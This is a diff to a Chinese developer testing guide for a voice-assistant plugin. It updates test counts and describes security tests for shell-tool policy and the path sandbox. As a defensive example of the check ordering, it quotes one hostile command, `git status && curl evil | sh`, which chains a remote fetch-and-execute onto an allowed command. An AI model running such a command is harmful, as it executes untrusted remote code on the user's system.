@@ -25,7 +25,7 @@ python scripts/e2e_simulated.py
 
 第一条检查单元、契约和适配器；第二条检查插件最小生命周期；第三条覆盖模拟链路：唤醒、识别文本、会话发送、回复、TTS 事件、连续对话、取消和停止。
 
-当前基线 **169 passed, 2 skipped**（2 个 skip 是可选的 VoxCord 适配器）。声纹模型已就位，所以 `tests/integration/test_speaker_model.py` 的 5 个用例现在会真跑；模型缺失的机器上它们 skip —— skip 数会随环境变化，**passed 数下降才是回归**。
+当前基线 **300 passed, 3 skipped**（2 个 skip 是可选的 VoxCord 适配器，1 个是符号链接越界用例 —— 本账户无权创建符号链接）。声纹模型已就位，所以 `tests/integration/test_speaker_model.py` 的 5 个用例现在会真跑；模型缺失的机器上它们 skip —— skip 数会随环境变化，**passed 数下降才是回归**。
 
 ## 契约或事件字段变更
 
@@ -157,6 +157,23 @@ python -c "from core.providers import VoxCordAdapter; print(VoxCordAdapter().loa
 
 `voice` 与 `agent` 两个 origin 必须走同一道 `ToolPolicy.check()`。新增工具时先确认 `policy.py` 已覆盖它，再写工具本体 —— 顺序反了就会出现一个没有门的工具。
 
+当前 **123 passed, 1 skipped**（skip 是符号链接越界，本账户无权创建符号链接；它检查的性质由 `resolve_in_sandbox` 的单元断言兜着）。两个文件分工明确：`test_tools.py`（35）测该成功的，`test_tool_security.py`（89）测**该失败的** —— 一个停止拒绝 `../` 的沙箱仍然会通过每一条正向测试，所以拒绝路径必须逐条钉死。
+
+四条改动时最容易踩的：
+
+- **加第 14 条危险模式必须同时加样本。** `test_every_hard_block_has_a_sample` 断言 `DANGEROUS_SAMPLES` 的键集合等于 `DANGEROUS_PATTERNS` 的名字集合，少一条就红。这是有意的：一条没有样本的模式等于没被测过。
+- **`confirmed` 必须 `is True`，不是真值。** `"confirmed": "no"` 是个真值字符串，按真值判断等于直接放行 —— 这是测试真抓出来的缺陷，`policy.py` 与 `shell.py` **两处**都要保持恒等比较。
+- **检查顺序不能动**：命令存在 → 危险形状 → 白名单 → 已验说话人 → 确认。形状必须在白名单之前，否则 `git status && curl evil | sh` 会先被认成允许项；而且被拦下的命令永远不该以「待确认」的形式出现在唤醒球上。
+- **形状检查要对原始串和 `shlex` 重组串各查一遍**，只查一边会被引号绕过。
+
+改完工具与语音路径的接线，另跑 `tests/test_plugin_tools.py`（工具接线 8 项）并看诊断：
+
+```powershell
+.\.venv\Scripts\python.exe -c "from evox_plugin import VoicePlugin; import json; print(json.dumps(VoicePlugin().diagnose()['tools'], ensure_ascii=False, indent=2))"
+```
+
+未 attach 时应报 `attached: false` 加一条告警；attach 后只报注册名、计数、沙箱根与告警，**不得出现任何路径参数、文件正文或命令输出**。`shell.run` 开着时诊断必须出显式告警。
+
 ## 记忆回归
 
 适用时机：修改 `core/memory/`(`store` / `write` / `recall`)或记忆 schema 后。
@@ -165,7 +182,7 @@ python -c "from core.providers import VoxCordAdapter; print(VoxCordAdapter().loa
 .\.venv\Scripts\python.exe -m pytest tests/test_memory.py -q
 ```
 
-当前 **62 passed**；改了记忆与语音路径的接线还要跑 `tests/test_plugin_tools.py`（16 个用例，含记忆接线 6 项）。
+当前 **62 passed**；改了记忆与语音路径的接线还要跑 `tests/test_plugin_tools.py`（24 个用例，含记忆接线 6 项与工具接线 8 项，两者合跑 **86 passed**）。
 
 四组：写入、召回、去重、审计。两条红线断言：**音频永不入库**（`records` 表每一列都是 `TEXT` 或 `INTEGER`，没有 BLOB 可放音频；`write()` 遇 `bytes` 抛 `TypeError`），`asr.final` 入库前过敏感模式过滤（9 个凭据样本整条拒绝，5 句含「密码」「token」的日常话不误伤）。SQLite 必须保持单文件；改 schema 前先定迁移路径，不要靠删库重建。
 
@@ -343,4 +360,4 @@ rg "TODO|FIXME|release blocker|not verified" core evox_plugin desktop docs tests
 - 前端修改：`npm run build`；窗口属性修改再加 `cargo check` 和 Windows 实机验收。
 - 模型或依赖变更：记录版本、来源、归档校验结果到 `THIRD_PARTY_NOTICES.md` 和 `docs/research/prototype-results.md`。
 
-每个阶段收尾一律跑全量 `python -m pytest tests -q`（当前基线 **169 passed, 2 skipped**），不用单文件绿灯代替全量。
+每个阶段收尾一律跑全量 `python -m pytest tests -q`（当前基线 **300 passed, 3 skipped**），不用单文件绿灯代替全量。
